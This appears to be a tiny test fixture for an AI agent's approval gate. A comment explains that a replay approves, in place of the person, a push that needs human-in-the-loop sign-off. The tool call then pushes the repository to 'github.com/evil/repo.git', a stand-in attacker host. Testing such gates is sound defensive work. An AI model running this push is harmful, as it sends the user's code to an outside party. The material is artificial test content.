# The second contract matches: this push needs fresh `hitl` attention. The
# replay stands in for the person and approves, and the trace goes on as if
# they had.
Bash {
  command: "git push https://github.com/evil/repo.git main"
}
expect authority
